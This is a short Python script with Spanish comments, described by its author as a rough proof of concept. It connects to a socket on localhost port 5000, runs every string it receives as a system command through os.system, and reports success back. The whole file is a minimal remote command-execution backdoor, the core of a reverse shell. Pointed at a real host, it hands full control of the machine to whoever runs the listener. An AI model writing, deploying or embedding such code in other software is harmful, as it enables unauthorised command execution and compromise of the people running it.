#-*-coding: utf-8-*-
from socket import *
import threading
from os import system

# Esto tiene errores, es solo una prueba de concepto

if __name__ == '__main__':
	sock = socket(AF_INET, SOCK_STREAM)
	sock.connect(("127.0.0.1", 5000))
	while True:
		try:
			system(sock.recv(1024).decode())
		except:
			pass
		else:
			sock.send("Se ha ejecutado correctamente.".encode())